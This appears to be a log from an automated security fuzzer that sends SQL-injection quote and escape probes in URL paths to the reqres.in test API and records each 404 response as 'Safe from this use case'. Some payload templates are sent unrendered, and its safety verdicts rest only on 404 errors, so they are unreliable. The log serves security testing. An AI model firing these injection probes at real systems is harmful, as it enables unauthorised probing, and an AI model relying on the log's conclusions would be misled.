+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:25 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'3\', \'cf-request-id\': \'0a58bf506000002e237ab37000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=W1jW%2Bw3ARfko3ez3abglGODkWDYj%2BGe8MXKTAmKsk1DKoPoinSDhzEsBq72qdKOO5G1t%2FUquGvZAdB23okZdLwM4qnSyQr34cGeTsIwLyUbZqPneP3V4"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34c6ffae2e23-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"1\'1"
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:26 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf50d800000e8c96aa6000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=O1R6Rr85Jp1VUFVJcJvZKngFQnnbFQyFxlakvENceODcVLpp1%2FJu4%2BEsAZTkwYHWb3xAp2jmmc5N3YWjAL3gRF5B1fGuzS5ugRzd57V4ZmoX0aUmyvg9"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34c7bdca0e8c-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "1\'1"
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:26 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf52dc00003194a58b9000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=iVEPmHV9KfWTWMu4RU0r%2F9%2B1P93nx5C0rbZBhVK6lwD3Ouh%2BvwMbGeW5sokUuh7SvD3pt5YC7OzKtaDS8tkOWSvtht92IAkeTg%2FCuFw9CcDVGKqXSvXr"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34caf8ba3194-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 6 = "-%s"%(r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:27 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'5\', \'cf-request-id\': \'0a58bf54fa00000e08a819d000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=N9MM%2BoPzUp6H8qA9kOPmEWo1vl8zehUvk7OAZ18q38oLTYhGQ9%2FF9TNCYDSfzzsabE5dGTyqtQzkmmtA%2BHNqbLvnpjoYb5NTW6Ui2TrBriq9bEKljzTZ"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34ce5e120e08-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"-%s"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:27 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf55790000699982903000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=F9es1H%2FC%2BTcmzxW9HCgal3AotmLjIFAF9g%2F3saY7GkvlDkdE8aIXG5aP1kpPT8GT1YCHnXpxAZmsTm0p4W42Y5lVG9az%2FAMIcxPbyzSh22Hie0zDNP5B"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34cf2ab16999-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "-%s"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:27 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf570b000031ab9e90f000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=PPJEyWByYkeDtgUV4oUCLlIbuHnahJ4mnD6I0Mjx8hUsOSWfItL6cEl9OXx4ziZ8r3rOysuwG7SXI2Pxfnpvvkhl6Ft7i2fepqC76AjhX15YC9HtullD"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34d1ab2731ab-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 7 = "\'%s"%(r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:28 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'6\', \'cf-request-id\': \'0a58bf592600000e8893297000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=1fYDlYfQKdPZbQArC6WjilBsJkh2R%2FDgZ0B2UwWTDjoJ9jJgNYnB4u%2FjHsmo9KHfJi7XYOFglLQV9GHHg3FnfUTn5gqYBSExqthep5lEr0iZVNCWn7m%2F"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34d50ce00e88-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"\'%s"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:28 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf5a0000003193ec023000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=kuBEQQau0u35AFW2OImYZV%2BXfg%2BuaOcNf6UVF1xNU5al2%2FnQ4ZubHL2q9ityKEAo28zWS1ucZB%2F%2BVm4EaitITtffdrxYBolY3qhfT6O2H4EPa%2BYUC2wS"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34d668b03193-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "\'%s"%(r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:29 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf5b8200000e40bdaa9000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=QSF1a0pD0f3aABVRncKAAUSFg1JdoIW5CeNFLuteC70s%2B6BlEScChXWBh%2BsM5mQ8Dna0ANg56TQZci%2FTBXz5upHEm8egMYgyEGsQuPl6%2But8gcsgg3EI"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34d8dd690e40-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 8 = "%s\'"%(r_string(10))
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:29 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'7\', \'cf-request-id\': \'0a58bf5d1800000ed8c9a2e000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=B5wdb3P5JeyHGkxg%2Fv909W9J7t4mzl9nzLyKY2ScJtvekJkU%2Bm2M%2BKiID5AC17Vw9lUhhvZamqmRUbm%2BEU0Gi3JyWwCQ4eMrgcN%2F9okKtYNIPoPHgOtJ"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34db5ea00ed8-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"%s\'"%(r_string(10))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:29 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'x-powered-by\': \'Express\', \'access-control-allow-origin\': \'*\', \'etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf5d8a00002e4c439fd000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=MswtDm6KRNkBrF4SFqT0DGp%2BsqFU5sh7IMUK%2BicWFVAlYTbCQnApovde9xl1SkVU3AUy2vmQ0pEte%2FWORTq7ihrQPGSJbl3jKsMrEe3%2FMmX62g0Kd7v2"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34dc09ab2e4c-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "%s\'"%(r_string(10))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:29 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf5f2300000e3b54819000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=w%2BtWtD8z3bP3CN9aSBRO%2Fm%2BR%2B9tEF2btYxgNM37odIyZ9snfIt9CWrnJ%2ByUPeAPK1j0YHzkt9fiM8VrFbBbMBvmyr%2Fvkqxy15s8VXEgWkpMAs0sxfjck"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34de9f800e3b-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 9 = "\\\"%s"%(r_string(10))
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:30 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'8\', \'cf-request-id\': \'0a58bf611100002e5873188000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=FOSjkzC2iqjcfU5SOil5Wp%2B9ivNbQ46vvWe0MIOmEu1dS0qfm9hbRkUsXA2LsrZcT5HyBri2qronwOnCEGP%2B5SmG7CEf50Of%2B1petxOfcoIgEVcQdJCZ"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34e1bd3b2e58-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"\\\"%s"%(r_string(10))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:30 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf617d00002e7082091000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=xWr9I5hXDweDCF1wiQrRiJq7T%2BjGy3nkKfnoMM23c3GeYQTMDzobhiVTQUXiR%2FYhUv7EXZ2e0EnJvzP1SatNVgNfgEIC2W%2FwbrD79OWal5uh3bSzA1I2"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34e26a3a2e70-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "\\\"%s"%(r_string(10))
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:30 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf62f800002e3b1f800000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=iNRvwceu6PXDbxSew05f4%2BvGmrUGNnNeS90ss9eeE18PuWjw2mlXKQxK3ADsbbYN4BaVhf0In11vDGpTwOrc3sKyFyqcRFMk%2FqFuYbEtLO1Cq15jzBVc"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34e4c87d2e3b-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+=======after hit
+{}
+Shhetname&lt;Worksheet "SQL"&gt;
+Row 10 = "%s=\'%s"%(r_time(),r_time())
+loaded param
+https://reqres.in/api/users/'
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:31 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'HIT\', \'Age\': \'9\', \'cf-request-id\': \'0a58bf648300000ef892901000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=tWxovXwDDffPcxh2XQdakEeX8artzjuAlCaGWjcmYjwcz24KLEyeG0np1%2FFl3q1K5JoNrsGgqERPzdOAaTOai9uU%2FRSFafDg3wzT8cn2w%2BtvgKO11ZLI"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34e73b3b0ef8-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL ***********************************
+https://reqres.in/api/users/2"%s=\'%s"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:31 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf64eb00000e106e9ba000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=iBmtQR74qea2ZzhIOj3sLk78fEs04l8qWKuBVo%2BQvGQj71TmY8WTi5A0ZrLhORXExz2jPNFmBzZnEHB%2BI7X7o8VVlqf9MnSqq3VExEOA0GuC4ZP0t5Nt"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34e7dc740e10-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, h3-29=":443"; ma=86400\'}', 'ResponseCookie': '&lt;RequestsCookieJar[]&gt;'}
+The functionality responded
+Your status code404
+Safe from this use case
+WE have a URL with space ***********************************
+https://reqres.in/api/users/2 "%s=\'%s"%(r_time(),r_time())
+Its GET API
+Executed GET Method for payload
+{'StatusCode': '404', 'ResponseBody': '{}', 'ResponseHeader': '{\'Date\': \'Sat, 29 May 2021 08:03:31 GMT\', \'Content-Type\': \'application/json; charset=utf-8\', \'Content-Length\': \'2\', \'Connection\': \'keep-alive\', \'X-Powered-By\': \'Express\', \'Access-Control-Allow-Origin\': \'*\', \'Etag\': \'W/"2-vyGp6PvFo4RvsFtPoIWeCReyIC8"\', \'Via\': \'1.1 vegur\', \'Cache-Control\': \'max-age=14400\', \'CF-Cache-Status\': \'EXPIRED\', \'cf-request-id\': \'0a58bf66b2000031a512b17000000001\', \'Expect-CT\': \'max-age=604800, report-uri="https://report-uri.cloudflare.com/cdn-cgi/beacon/expect-ct"\', \'Report-To\': \'{"endpoints":[{"url":"https:\\\\/\\\\/a.nel.cloudflare.com\\\\/report\\\\/v2?s=gdJDCP0PM7BGGG8%2Fn6lObuNDdryqtbw1YWKUCOIqxIlvtMMQePmV%2FNx9UKXjLwKRA7nmZNaj04KoZO4Vg9lVNvATscVJ%2BUNBRv0tNz15Eqx8uof%2F1IPY"}],"group":"cf-nel","max_age":604800}\', \'NEL\': \'{"report_to":"cf-nel","max_age":604800}\', \'Vary\': \'Accept-Encoding\', \'Server\': \'cloudflare\', \'CF-RAY\': \'656e34eab92931a5-BOM\', \'alt-svc\': \'h3-27=":443"; ma=86400, h3-28=":443"; ma=86400, 